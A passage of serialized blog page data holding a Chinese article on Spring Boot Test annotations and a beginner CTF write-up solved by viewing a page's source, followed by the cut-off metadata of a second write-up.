20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"单元测试：SpringBoot Test",frontmatter:{title:"单元测试：SpringBoot Test",date:"2022-09-17T00:00:00.000Z",tags:["单元测试","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%953.html",relativePath:"views/backend/单元测试3.md",key:"v-53fbd5a8",path:"/views/backend/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%953.html",headers:[{level:2,title:"1. 功能分类",slug:"_1-功能分类",normalizedTitle:"1. 功能分类",charIndex:173},{level:2,title:"1.1 配置类型的注解",slug:"_1-1-配置类型的注解",normalizedTitle:"1.1 配置类型的注解",charIndex:184},{level:3,title:"1.2 mock类型的注解",slug:"_1-2-mock类型的注解",normalizedTitle:"1.2 mock类型的注解",charIndex:201},{level:3,title:"1.3 自动配置类型的注解（@AutoConfigure*）",slug:"_1-3-自动配置类型的注解-autoconfigure",normalizedTitle:"1.3 自动配置类型的注解（@autoconfigure*）",charIndex:220},{level:3,title:"1.4 启动测试类型的注解（@*Test）",slug:"_1-4-启动测试类型的注解-test",normalizedTitle:"1.4 启动测试类型的注解（@*test）",charIndex:256},{level:2,title:"2. 相互之间的搭配组合",slug:"_2-相互之间的搭配组合",normalizedTitle:"2. 相互之间的搭配组合",charIndex:281},{level:2,title:"3. 相似注解的区别和联系",slug:"_3-相似注解的区别和联系",normalizedTitle:"3. 相似注解的区别和联系",charIndex:297},{level:3,title:"3.1 @TestComment vs @Comment",slug:"_3-1-testcomment-vs-comment",normalizedTitle:"3.1 @testcomment vs @comment",charIndex:316},{level:3,title:"3.2 @TestConfiguration vs @Configuration",slug:"_3-2-testconfiguration-vs-configuration",normalizedTitle:"3.2 @testconfiguration vs @configuration",charIndex:350},{level:3,title:"3.3 @SpringBootTest vs @WebMvcTest(或@*Test)",slug:"_3-3-springboottest-vs-webmvctest-或-test",normalizedTitle:"3.3 @springboottest vs @webmvctest(或@*test)",charIndex:396},{level:2,title:"4. 小结",slug:"_4-小结",normalizedTitle:"4. 小结",charIndex:443}],excerpt:"<Boxx/>\n<p>Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库，在 Spring Boot 2.2.0 版本之前，spring-boot-starter-test 包含了 JUnit 4 的依赖，Spring Boot 2.2.0 版本之后替换成了 Junit Jupiter （没有@RunWith注解了）。</p>\n",headersStr:"1. 功能分类 1.1 配置类型的注解 1.2 mock类型的注解 1.3 自动配置类型的注解（@AutoConfigure*） 1.4 启动测试类型的注解（@*Test） 2. 相互之间的搭配组合 3. 相似注解的区别和联系 3.1 @TestComment vs @Comment 3.2 @TestConfiguration vs @Configuration 3.3 @SpringBootTest vs @WebMvcTest(或@*Test) 4. 小结",content:'Spring Boot 2.2.0 版本开始引入 JUnit 5 作为单元测试默认库，在 Spring Boot 2.2.0 版本之前，spring-boot-starter-test 包含了 JUnit 4 的依赖，Spring Boot 2.2.0 版本之后替换成了 Junit Jupiter （没有@RunWith注解了）。\n\n\n\n * 1. 功能分类\n * 1.1 配置类型的注解\n   * 1.2 mock类型的注解\n   * 1.3 自动配置类型的注解（@AutoConfigure*）\n   * 1.4 启动测试类型的注解（@*Test）\n * 2. 相互之间的搭配组合\n * 3. 相似注解的区别和联系\n   * 3.1 @TestComment vs @Comment\n   * 3.2 @TestConfiguration vs @Configuration\n   * 3.3 @SpringBootTest vs @WebMvcTest(或@*Test)\n * 4. 小结\n\n\n\nSpringBootTest默认集成了以下功能：\n\n * JUnit 5: Java单元测试框架\n * Spring Test & Spring Boot Test: Spring Boot的测试工具和支持\n * AssertJ: 流式断言\n * Hamcrest: Hamcrest断言\n * Mockito: Java Mock框架\n * JSONassert: JSON断言\n * JsonPath: XPath for JSON\n\n\n# 1. 功能分类\n\n从功能上讲，Spring Boot Test中的注解主要分如下几类：\n\n类别       示例                    格式                说明\n配置类型     @TestConfiguration等                     提供一些测试相关的配置入口\nmock类型   @MockBean等                              提供mock支持\n启动测试类型   @SpringBootTest       @*Test            以Test结尾的注解，具有加载applicationContext的能力\n自动配置类型   @AutoConfigureJdbc等   @AutoConfigure*   以AutoConfigure开头的注解，具有加载测试支持功能的能力。\n\n\n# 1.1 配置类型的注解\n\n注解                           作用                                                                                                  实践中的使用\n@TestComponent               该注解另一种@Component，在语义上用来指定某个Bean是专门用于测试的。                                                            该注解适用于测试代码和正式混合在一起时，不加载被该注解描述的Bean，使用不多。\n@TestConfiguration           该注解是另一种@TestComponent，它用于补充额外的Bean或覆盖已存在的Bean                                                       在不修改正式代码的前提下，使配置更加灵活\n@TypeExcludeFilters          用来排除@TestConfiguration和@TestComponent                                                               适用于测试代码和正式代码混合的场景，使用不多\n@OverrideAutoConfiguration   可用于覆盖@EnableAutoConfiguration，与ImportAutoConfiguration结合使用，以限制所加载的自动配置类                             在不修改正式代码的前提下，提供了修改配置自动配置类的能力\n@PropertyMapping             定义@AutoConfigure*注解中用到的变量名称，例如在@AutoConfigureMockMvc中定义名为spring.test.mockmvc.webclient.enabled的变量   一般不使用\n\n> 使用@SpringBootApplication启动测试或者生产代码，被@TestComponent描述的Bean会自动被排除掉。如果不是则需要向@SpringBootApplication添加TypeExcludeFilter。\n\n\n# 1.2 mock类型的注解\n\n注解           作用\n@MockBean    用于mock指定的class或被注解的属性（或者说在测试类中排除一个bean，Spring将使用这个mock而不是真正的类，所以不会调用@PostConstruct方法）\n@MockBeans   使@MockBean支持在同一类型或属性上多次出现\n@SpyBean     用于spy指定的class或被注解的属性\n@SpyBeans    使@SpyBeans支持在同一类型或属性上多次出现\n\n@MockBean和@SpyBean这两个注解，在mockito框架中本来已经存在，且功能基本相同。Spring Boot Test又定义一份重复的注解，目的在于使MockBean和SpyBean被ApplicationContext管理，从而方便使用。\n\n> MockBean和SpyBean功能非常相似，都能模拟方法的各种行为。不同之处在于MockBean是全新的对象，跟正式对象没有关系；而SpyBean与正式对象紧密联系，可以模拟正式对象的部分方法，没有被模拟的方法仍然可以运行正式代码。\n\n\n# 1.3 自动配置类型的注解（@AutoConfigure*）\n\n注解                                    作用\n@AutoConfigureJdbc                    自动配置 JDBC\n@AutoConfigureCache                   自动配置缓存\n@AutoConfigureDataLdap                自动配置 LDAP\n@AutoConfigureJson                    自动配置 JSON\n@AutoConfigureJsonTesters             自动配置 JsonTester\n@AutoConfigureDataJpa                 自动配置 JPA\n@AutoConfigureTestEntityManager       自动配置 TestEntityManager\n@AutoConfigureRestDocs                自动配置 Rest Docs\n@AutoConfigureMockRestServiceServer   自动配置 MockRestServiceServer\n@AutoConfigureWebClient               自动配置 WebClient\n@AutoConfigureWebFlux                 自动配置 WebFlux\n@AutoConfigureWebTestClient           自动配置 WebTestClient\n@AutoConfigureMockMvc                 自动配置 MockMvc\n@AutoConfigureWebMvc                  自动配置 WebMvc\n@AutoConfigureDataNeo4j               自动配置 Neo4j\n@AutoConfigureDataRedis               自动配置 Redis\n@AutoConfigureJooq                    自动配置 Jooq\n@AutoConfigureTestDatabase            自动配置Test Database，可以使用内存数据库\n\n这些注解可以搭配@\\*Test使用，用于开启在@\\*Test中未自动配置的功能。例如@SpringBootTest和@AutoConfigureMockMvc组合后，就可以注入org.springframework.test.web.servlet.MockMvc。\n\n> “自动配置类型”有两种使用方式：\n> \n>  1. 在功能测试（即使用@SpringBootTest）时显示添加。\n>  2. 一般在切片测试中被隐式使用，例如@WebMvcTest注解时，隐式添加了@AutoConfigureCache、@AutoConfigureWebMvc、@AutoConfigureMockMvc。\n\n> 实现原理 与spring-boot-\bautoconfigure\b\b中的@\\*AutoConfiguration实现略有不同，Test包中的@AutoConfigure\\*通过DeterminableImports接口作为指定代码的识别入口，通过ImportAutoConfiguration注解作为配置入口，从Test包下的spring.factories读取配置文件，每个@AutoConfigure\\*中都可以包含多个\bSpring Boot的@\\*AutoConfiguration，例如：\n> \n> \n> \n> AutoConfigureWebMvc\n\n\n# 1.4 启动测试类型的注解（@*Test）\n\n所有的 @*Test 注解都被 @BootstrapWith 注解，它们可以启动 ApplicationContext，是测试的入口，所有的测试类必须声明一个 @*Test注解。\n\n注解                作用                                                                                \n@SpringBootTest   自动侦测并加载@SpringBootApplication或@SpringBootConfiguration中的配置，默认web环境为MOCK，不监听任务端口   \n@DataRedisTest    测试对Redis操作，自动扫描被@RedisHash描述的类，并配置Spring Data Redis的库                             \n@DataJpaTest      测试基于JPA的数据库操作，同时提供了TestEntityManager替代JPA的EntityManager                           \n@DataJdbcTest     测试基于Spring Data JDBC的数据库操作                                                        \n@JsonTest         测试JSON的序列化和反序列化                                                                   \n@WebMvcTest       测试Spring MVC中的controllers                                                         \n@WebFluxTest      测试Spring WebFlux中的controllers                                                     \n@RestClientTest   测试对REST客户端的操作                                                                     \n@DataLdapTest     测试对LDAP的操作                                                                        \n@DataMongoTest    测试对MongoDB的操作                                                                     \n@DataNeo4jTest    测试对Neo4j的操作                                                                       \n\n> 除了@SpringBootTest之外的注解都是用来进行切面测试的，他们会默认导入一些自动配置，点击官方docs查看详情。\n\n一般情况下，推荐使用@SpringBootTest而非其它切片测试的注解，简单有效。若某次改动仅涉及特定切片，可以考虑使用切片测试。\n\n@SpringBootTest是这些注解中最常用的一个，其中包含的配置项如下：\n\n配置名称             说明\nvalue            指定配置属性\nproperties       指定配置属性，和value意义相同\nclasses          指定配置类，等同于@ContextConfiguration中的class，若没有显示指定，将查找嵌套的@Configuration类，然后返回到SpringBootConfiguration搜索配置\nwebEnvironment   指定web环境，可选值有：MOCK、RANDOM_PORT、DEFINED_PORT、NONE\n\nwebEnvironment详细说明：\n\n可选值            说明\nMOCK           此值为默认值，该类型提供一个mock环境，此时内嵌的服务（servlet容器）并没有真正启动，也不会监听web端口。\nRANDOM_PORT    启动一个真实的web服务，监听一个随机端口。\nDEFINED_PORT   启动一个真实的web服务，监听一个定义好的端口（从配置中读取）。\nNONE           启动一个非web的ApplicationContext，既不提供mock环境，也不提供真是的web服务。\n\n\n# 2. 相互之间的搭配组合\n\n典型的搭配如下：\n\npackage sample.test;\n\nimport org.junit.Before;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport sample.test.domain.VehicleIdentificationNumber;\nimport sample.test.service.VehicleDetails;\nimport sample.test.service.VehicleDetailsService;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.test.autoconfigure.jdbc.AutoConfigureTestDatabase;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.boot.test.context.SpringBootTest.WebEnvironment;\nimport org.springframework.boot.test.mock.mockito.MockBean;\nimport org.springframework.boot.test.web.client.TestRestTemplate;\nimport org.springframework.test.context.junit4.SpringRunner;\n\nimport static org.mockito.BDDMockito.given;\n\n/**\n * {@code @SpringBootTest} with a random port for {@link SampleTestApplication}.\n *\n * @author Phillip Webb\n */\n@RunWith(SpringRunner.class)\n@SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT)\n@AutoConfigureTestDatabase\npublic class SampleTestApplicationWebIntegrationTests {\n\n    private static final VehicleIdentificationNumber VIN = new VehicleIdentificationNumber(\n            "01234567890123456");\n\n    @Autowired\n    private TestRestTemplate restTemplate;\n\n    @MockBean\n    private VehicleDetailsService vehicleDetailsService;\n\n    @Before\n    public void setup() {\n        given(this.vehicleDetailsService.getVehicleDetails(VIN))\n                .willReturn(new VehicleDetails("Honda", "Civic"));\n    }\n\n    @Test\n    public void test() {\n        this.restTemplate.getForEntity("/{username}/vehicle", String.class, "sframework");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n * @RunWith(SpringRunner.class)是JUnit的注解，作用是关联Spring Boot Test，在运行JUnit时同时启动Spring\n * @SpringBootTest(webEnvironment = WebEnvironment.RANDOM_PORT) 作用是启动Spring的ApplicationContext，参数webEnvironment指定了运行的web环境\n * @AutoConfigureTestDatabase 作用是启动一个内存数据库，不使用真实的数据库\n\n其中@RunWith和@Test必须存在，@AutoConfigure可以同时配置任意多个，而配置类型的注解可以在需要时添加。\n\n\n# 3. 相似注解的区别和联系\n\n\n# 3.1 @TestComment vs @Comment\n\n * @TestComponent是另一种@Component，在语义上用来指定某个Bean是专门用于测试的\n * 使用@SpringBootApplication服务时，@TestComponent会被自动排除\n\n\n# 3.2 @TestConfiguration vs @Configuration\n\n * @TestConfiguration是Spring Boot Boot Test提供的，@Configuration是Spring Framework提供的。\n * @TestConfiguration实际上是也是一种@TestComponent，只是这个@TestComponent专门用来做配置用。\n * @TestConfiguration和@Configuration不同，它不会阻止@SpringBootTest的查找机制，相当于是对既有配置的补充或覆盖。\n\n\n# 3.3 @SpringBootTest vs @WebMvcTest(或@*Test)\n\n * 都可以启动 Spring 的 ApplicationContext\n * @SpringBootTest自动侦测并加载@SpringBootApplication或@SpringBootConfiguration中的配置，@WebMvcTest不侦测配置，只是默认加载一些自动配置。\n * @SpringBootTest测试范围一般比@WebMvcTest大。\n\n\n# 4. 小结\n\n本文主要介绍了Spring Boot Test中新增的注解，这些注解分为这几个类型：配置类型、mock类型、启动测试类型、自动配置类型。\n\n 1. “配置类型”中的@TestComponent、@TestConfiguration、@OverrideAutoConfiguration使配置更加灵活。\n 2. 封装了mockito的@MockBean和@SpyBean，使其可以自然的注入到Spring容器中。\n 3. 每个测试类必须包含一个“启动测试类型”的注解(@\\*Test)，同时可以根据需要添加”自动配置类型”的注解(@AutoConfigure*)。\n 4. @SpringBootTest是最常用的“启动测试类型”注解',normalizedContent:'spring boot 2.2.0 版本开始引入 junit 5 作为单元测试默认库，在 spring boot 2.2.0 版本之前，spring-boot-starter-test 包含了 junit 4 的依赖，spring boot 2.2.0 版本之后替换成了 junit jupiter （没有@runwith注解了）。\n\n\n\n * 1. 功能分类\n * 1.1 配置类型的注解\n   * 1.2 mock类型的注解\n   * 1.3 自动配置类型的注解（@autoconfigure*）\n   * 1.4 启动测试类型的注解（@*test）\n * 2. 相互之间的搭配组合\n * 3. 相似注解的区别和联系\n   * 3.1 @testcomment vs @comment\n   * 3.2 @testconfiguration vs @configuration\n   * 3.3 @springboottest vs @webmvctest(或@*test)\n * 4. 小结\n\n\n\nspringboottest默认集成了以下功能：\n\n * junit 5: java单元测试框架\n * spring test & spring boot test: spring boot的测试工具和支持\n * assertj: 流式断言\n * hamcrest: hamcrest断言\n * mockito: java mock框架\n * jsonassert: json断言\n * jsonpath: xpath for json\n\n\n# 1. 功能分类\n\n从功能上讲，spring boot test中的注解主要分如下几类：\n\n类别       示例                    格式                说明\n配置类型     @testconfiguration等                     提供一些测试相关的配置入口\nmock类型   @mockbean等                              提供mock支持\n启动测试类型   @springboottest       @*test            以test结尾的注解，具有加载applicationcontext的能力\n自动配置类型   @autoconfigurejdbc等   @autoconfigure*   以autoconfigure开头的注解，具有加载测试支持功能的能力。\n\n\n# 1.1 配置类型的注解\n\n注解                           作用                                                                                                  实践中的使用\n@testcomponent               该注解另一种@component，在语义上用来指定某个bean是专门用于测试的。                                                            该注解适用于测试代码和正式混合在一起时，不加载被该注解描述的bean，使用不多。\n@testconfiguration           该注解是另一种@testcomponent，它用于补充额外的bean或覆盖已存在的bean                                                       在不修改正式代码的前提下，使配置更加灵活\n@typeexcludefilters          用来排除@testconfiguration和@testcomponent                                                               适用于测试代码和正式代码混合的场景，使用不多\n@overrideautoconfiguration   可用于覆盖@enableautoconfiguration，与importautoconfiguration结合使用，以限制所加载的自动配置类                             在不修改正式代码的前提下，提供了修改配置自动配置类的能力\n@propertymapping             定义@autoconfigure*注解中用到的变量名称，例如在@autoconfiguremockmvc中定义名为spring.test.mockmvc.webclient.enabled的变量   一般不使用\n\n> 使用@springbootapplication启动测试或者生产代码，被@testcomponent描述的bean会自动被排除掉。如果不是则需要向@springbootapplication添加typeexcludefilter。\n\n\n# 1.2 mock类型的注解\n\n注解           作用\n@mockbean    用于mock指定的class或被注解的属性（或者说在测试类中排除一个bean，spring将使用这个mock而不是真正的类，所以不会调用@postconstruct方法）\n@mockbeans   使@mockbean支持在同一类型或属性上多次出现\n@spybean     用于spy指定的class或被注解的属性\n@spybeans    使@spybeans支持在同一类型或属性上多次出现\n\n@mockbean和@spybean这两个注解，在mockito框架中本来已经存在，且功能基本相同。spring boot test又定义一份重复的注解，目的在于使mockbean和spybean被applicationcontext管理，从而方便使用。\n\n> mockbean和spybean功能非常相似，都能模拟方法的各种行为。不同之处在于mockbean是全新的对象，跟正式对象没有关系；而spybean与正式对象紧密联系，可以模拟正式对象的部分方法，没有被模拟的方法仍然可以运行正式代码。\n\n\n# 1.3 自动配置类型的注解（@autoconfigure*）\n\n注解                                    作用\n@autoconfigurejdbc                    自动配置 jdbc\n@autoconfigurecache                   自动配置缓存\n@autoconfiguredataldap                自动配置 ldap\n@autoconfigurejson                    自动配置 json\n@autoconfigurejsontesters             自动配置 jsontester\n@autoconfiguredatajpa                 自动配置 jpa\n@autoconfiguretestentitymanager       自动配置 testentitymanager\n@autoconfigurerestdocs                自动配置 rest docs\n@autoconfiguremockrestserviceserver   自动配置 mockrestserviceserver\n@autoconfigurewebclient               自动配置 webclient\n@autoconfigurewebflux                 自动配置 webflux\n@autoconfigurewebtestclient           自动配置 webtestclient\n@autoconfiguremockmvc                 自动配置 mockmvc\n@autoconfigurewebmvc                  自动配置 webmvc\n@autoconfiguredataneo4j               自动配置 neo4j\n@autoconfiguredataredis               自动配置 redis\n@autoconfigurejooq                    自动配置 jooq\n@autoconfiguretestdatabase            自动配置test database，可以使用内存数据库\n\n这些注解可以搭配@\\*test使用，用于开启在@\\*test中未自动配置的功能。例如@springboottest和@autoconfiguremockmvc组合后，就可以注入org.springframework.test.web.servlet.mockmvc。\n\n> “自动配置类型”有两种使用方式：\n> \n>  1. 在功能测试（即使用@springboottest）时显示添加。\n>  2. 一般在切片测试中被隐式使用，例如@webmvctest注解时，隐式添加了@autoconfigurecache、@autoconfigurewebmvc、@autoconfiguremockmvc。\n\n> 实现原理 与spring-boot-\bautoconfigure\b\b中的@\\*autoconfiguration实现略有不同，test包中的@autoconfigure\\*通过determinableimports接口作为指定代码的识别入口，通过importautoconfiguration注解作为配置入口，从test包下的spring.factories读取配置文件，每个@autoconfigure\\*中都可以包含多个\bspring boot的@\\*autoconfiguration，例如：\n> \n> \n> \n> autoconfigurewebmvc\n\n\n# 1.4 启动测试类型的注解（@*test）\n\n所有的 @*test 注解都被 @bootstrapwith 注解，它们可以启动 applicationcontext，是测试的入口，所有的测试类必须声明一个 @*test注解。\n\n注解                作用                                                                                \n@springboottest   自动侦测并加载@springbootapplication或@springbootconfiguration中的配置，默认web环境为mock，不监听任务端口   \n@dataredistest    测试对redis操作，自动扫描被@redishash描述的类，并配置spring data redis的库                             \n@datajpatest      测试基于jpa的数据库操作，同时提供了testentitymanager替代jpa的entitymanager                           \n@datajdbctest     测试基于spring data jdbc的数据库操作                                                        \n@jsontest         测试json的序列化和反序列化                                                                   \n@webmvctest       测试spring mvc中的controllers                                                         \n@webfluxtest      测试spring webflux中的controllers                                                     \n@restclienttest   测试对rest客户端的操作                                                                     \n@dataldaptest     测试对ldap的操作                                                                        \n@datamongotest    测试对mongodb的操作                                                                     \n@dataneo4jtest    测试对neo4j的操作                                                                       \n\n> 除了@springboottest之外的注解都是用来进行切面测试的，他们会默认导入一些自动配置，点击官方docs查看详情。\n\n一般情况下，推荐使用@springboottest而非其它切片测试的注解，简单有效。若某次改动仅涉及特定切片，可以考虑使用切片测试。\n\n@springboottest是这些注解中最常用的一个，其中包含的配置项如下：\n\n配置名称             说明\nvalue            指定配置属性\nproperties       指定配置属性，和value意义相同\nclasses          指定配置类，等同于@contextconfiguration中的class，若没有显示指定，将查找嵌套的@configuration类，然后返回到springbootconfiguration搜索配置\nwebenvironment   指定web环境，可选值有：mock、random_port、defined_port、none\n\nwebenvironment详细说明：\n\n可选值            说明\nmock           此值为默认值，该类型提供一个mock环境，此时内嵌的服务（servlet容器）并没有真正启动，也不会监听web端口。\nrandom_port    启动一个真实的web服务，监听一个随机端口。\ndefined_port   启动一个真实的web服务，监听一个定义好的端口（从配置中读取）。\nnone           启动一个非web的applicationcontext，既不提供mock环境，也不提供真是的web服务。\n\n\n# 2. 相互之间的搭配组合\n\n典型的搭配如下：\n\npackage sample.test;\n\nimport org.junit.before;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport sample.test.domain.vehicleidentificationnumber;\nimport sample.test.service.vehicledetails;\nimport sample.test.service.vehicledetailsservice;\n\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.test.autoconfigure.jdbc.autoconfiguretestdatabase;\nimport org.springframework.boot.test.context.springboottest;\nimport org.springframework.boot.test.context.springboottest.webenvironment;\nimport org.springframework.boot.test.mock.mockito.mockbean;\nimport org.springframework.boot.test.web.client.testresttemplate;\nimport org.springframework.test.context.junit4.springrunner;\n\nimport static org.mockito.bddmockito.given;\n\n/**\n * {@code @springboottest} with a random port for {@link sampletestapplication}.\n *\n * @author phillip webb\n */\n@runwith(springrunner.class)\n@springboottest(webenvironment = webenvironment.random_port)\n@autoconfiguretestdatabase\npublic class sampletestapplicationwebintegrationtests {\n\n    private static final vehicleidentificationnumber vin = new vehicleidentificationnumber(\n            "01234567890123456");\n\n    @autowired\n    private testresttemplate resttemplate;\n\n    @mockbean\n    private vehicledetailsservice vehicledetailsservice;\n\n    @before\n    public void setup() {\n        given(this.vehicledetailsservice.getvehicledetails(vin))\n                .willreturn(new vehicledetails("honda", "civic"));\n    }\n\n    @test\n    public void test() {\n        this.resttemplate.getforentity("/{username}/vehicle", string.class, "sframework");\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n * @runwith(springrunner.class)是junit的注解，作用是关联spring boot test，在运行junit时同时启动spring\n * @springboottest(webenvironment = webenvironment.random_port) 作用是启动spring的applicationcontext，参数webenvironment指定了运行的web环境\n * @autoconfiguretestdatabase 作用是启动一个内存数据库，不使用真实的数据库\n\n其中@runwith和@test必须存在，@autoconfigure可以同时配置任意多个，而配置类型的注解可以在需要时添加。\n\n\n# 3. 相似注解的区别和联系\n\n\n# 3.1 @testcomment vs @comment\n\n * @testcomponent是另一种@component，在语义上用来指定某个bean是专门用于测试的\n * 使用@springbootapplication服务时，@testcomponent会被自动排除\n\n\n# 3.2 @testconfiguration vs @configuration\n\n * @testconfiguration是spring boot boot test提供的，@configuration是spring framework提供的。\n * @testconfiguration实际上是也是一种@testcomponent，只是这个@testcomponent专门用来做配置用。\n * @testconfiguration和@configuration不同，它不会阻止@springboottest的查找机制，相当于是对既有配置的补充或覆盖。\n\n\n# 3.3 @springboottest vs @webmvctest(或@*test)\n\n * 都可以启动 spring 的 applicationcontext\n * @springboottest自动侦测并加载@springbootapplication或@springbootconfiguration中的配置，@webmvctest不侦测配置，只是默认加载一些自动配置。\n * @springboottest测试范围一般比@webmvctest大。\n\n\n# 4. 小结\n\n本文主要介绍了spring boot test中新增的注解，这些注解分为这几个类型：配置类型、mock类型、启动测试类型、自动配置类型。\n\n 1. “配置类型”中的@testcomponent、@testconfiguration、@overrideautoconfiguration使配置更加灵活。\n 2. 封装了mockito的@mockbean和@spybean，使其可以自然的注入到spring容器中。\n 3. 每个测试类必须包含一个“启动测试类型”的注解(@\\*test)，同时可以根据需要添加”自动配置类型”的注解(@autoconfigure*)。\n 4. @springboottest是最常用的“启动测试类型”注解',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"CTF攻防世界入门题单WriteUP-adworld-01",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-01",date:"2024-11-15T00:00:00.000Z",tags:["CTF","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-15-CTF-view_source-WriteUp.html",relativePath:"views/essay/2024-11-15-CTF-view_source-WriteUp.md",key:"v-e761f9d0",path:"/views/essay/2024-11-15-CTF-view_source-WriteUp.html",headers:[{level:3,title:"题目描述：",slug:"题目描述",normalizedTitle:"题目描述：",charIndex:73},{level:3,title:"考点：",slug:"考点",normalizedTitle:"考点：",charIndex:82},{level:3,title:"解题思路：",slug:"解题思路",normalizedTitle:"解题思路：",charIndex:89}],excerpt:'<Boxx/>\n<p>从零开始CTF竞赛的准备，这里根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，开始我写的第一篇WriteUP</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0474</td>\n<td>view_source</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述： 考点： 解题思路：",content:'从零开始CTF竞赛的准备，这里根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，开始我写的第一篇WriteUP\n\n\n\n * 题目描述：\n * 考点：\n * 解题思路：\n\n\n\n * 题单【传送门】\n * 官方WriteUP视频【传送门】\n\n题目编号       题目名称          题目方向   难度\nGFSJ0474   view_source   Web    1\n\n\n# 题目1：view_source\n\n\n# 题目描述：\n\nX老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n\n\n# 考点：\n\n * 查看网页源代码\n\n\n# 解题思路：\n\n进入目标地址以后，可以看到"Flag is not here"的提示，结合题目描述，可以考虑查看网页源代码。\n\n方法列举\n方法一：使用快捷键 Ctrl+U查看网页源代码\n方法二：在网页URL地址前加 "view-source:"\n方法三：使用F12快捷键，切换到Element页查看网页源代码\n方法四：鼠标右键，选择“查看网页源代码”（此处该方法已禁用）\n\n查看网页源代码后可以看到对应的cyberpeace{xxx}格式的flag',normalizedContent:'从零开始ctf竞赛的准备，这里根据hello-ctf项目的推荐，使用“攻防世界”的web方向入门题单，开始我写的第一篇writeup\n\n\n\n * 题目描述：\n * 考点：\n * 解题思路：\n\n\n\n * 题单【传送门】\n * 官方writeup视频【传送门】\n\n题目编号       题目名称          题目方向   难度\ngfsj0474   view_source   web    1\n\n\n# 题目1：view_source\n\n\n# 题目描述：\n\nx老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n\n\n# 考点：\n\n * 查看网页源代码\n\n\n# 解题思路：\n\n进入目标地址以后，可以看到"flag is not here"的提示，结合题目描述，可以考虑查看网页源代码。\n\n方法列举\n方法一：使用快捷键 ctrl+u查看网页源代码\n方法二：在网页url地址前加 "view-source:"\n方法三：使用f12快捷键，切换到element页查看网页源代码\n方法四：鼠标右键，选择“查看网页源代码”（此处该方法已禁用）\n\n查看网页源代码后可以看到对应的cyberpeace{xxx}格式的flag',charsets:{cjk:!0},lastUpdated:"2024/12/01, 19:03:09",lastUpdatedTimestamp:1733050989e3},{title:"CTF攻防世界入门题单WriteUP-adworld-02",frontmatter:{title:"CTF攻防世界入门题单WriteUP-adworld-02",date:"2024-11-16T00:00:00.000Z",tags:["CTF","adworld","WriteUP"],categories:["随笔 Essay"],isShowComments:!0,publish:!0},regularPath:"/views/essay/2024-11-16-1-CTF-get_post-WriteUp.html",relativePath:"views/essay/2024-11-16-1-CTF-get_post-WriteUp.md",key:"v-9a622198",path:"/views/essay/2024-11-16-1-CTF-get_post-WriteUp.html",headers:[{level:3,title:"题目描述:",slug:"题目描述",normalizedTitle:"题目描述:",charIndex:49},{level:3,title:"考点：",slug:"考点",normalizedTitle:"考点：",charIndex:58},{level:3,title:"解体思路：",slug:"解体思路",normalizedTitle:"解体思路：",charIndex:65},{level:4,title:"方法一：使用curl命令来请求，需要一定的linux基础",slug:"方法一-使用curl命令来请求-需要一定的linux基础",normalizedTitle:"方法一：使用curl命令来请求，需要一定的linux基础",charIndex:1047},{level:4,title:"方法二：使用Postman等网页调试和接口测试工具",slug:"方法二-使用postman等网页调试和接口测试工具",normalizedTitle:"方法二：使用postman等网页调试和接口测试工具",charIndex:1602}],excerpt:'<Boxx/>\n<p>根据hello-ctf项目的推荐，使用“攻防世界”的Web方向入门题单，我的第2道题</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>题单【<a href="https://adworld.xctf.org.cn/challenges/problem-set-index?id=25" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n<li>官方WriteUP视频【<a href="https://www.bilibili.com/video/BV1rz4y137dF/" target="_blank" rel="noopener noreferrer">传送门<OutboundLink/></a>】</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>题目编号</th>\n<th>题目名称</th>\n<th>题目方向</th>\n<th>难度</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>GFSJ0475</td>\n<td>get_post</td>\n<td>Web</td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n',headersStr:"题目描述: 考点： 解体思路： 方法一：使用curl命令来请求，需要一定的linux基础 